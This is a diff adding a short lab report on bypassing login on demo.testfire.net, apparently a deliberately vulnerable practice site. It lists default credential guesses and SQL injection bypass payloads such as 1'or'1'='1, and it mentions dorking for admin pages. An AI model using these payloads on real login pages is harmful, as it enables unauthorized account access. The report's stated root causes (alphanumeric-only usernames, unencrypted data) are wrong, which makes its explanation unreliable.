@@ -1,0 +1,56 @@
+Report:
+
+The practical of Web application penetration by( Bypass Authentication)
+
+Our target: Websites Admin Panel or Admin login page
+
+Websites:   http://demo.testfire.net/login.jsp
+
+
+1. we will be having admin login pages.
+
+2.Search for Admin pages in google ---> (http://demo.testfire.net/login.jsp) admin pages
+
+3.Attackers using google dorks  and by advnaced searching in google ,attacker first uses default uid and pass like
+
+uid:admin   ,  pass:admin
+uid:admin   ,  pass:password
+uid:Admin   ,  pass:Admin@123   ,ETC
+
+If he failed then he uses
+
+uid: 1'or'1'='1 
+pass:1'or'1'='1
+
+admin'or'1'='1 (true)
+login'or'1'='1  (true)
+
+Logic behind Database is
+
+uid	pass	Result
+T	F	F
+F	T	F
+T	T	T
+
+
+Reporting to the client:
+
+1.Take Screenshots (Before attack & After Attack)
+2.Give the Payload we have used to crack their authentication---> 1'or'1'='1
+
+Mistakes by the company's developers:
+
+1. The Web developer allowed alpha numeric only keys in username 
+2. Database Admin did not encrypted  data in database 
+
+
+cheatsheet for uid and pass- link:
+https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
+
+
+
+
+
+
+
+
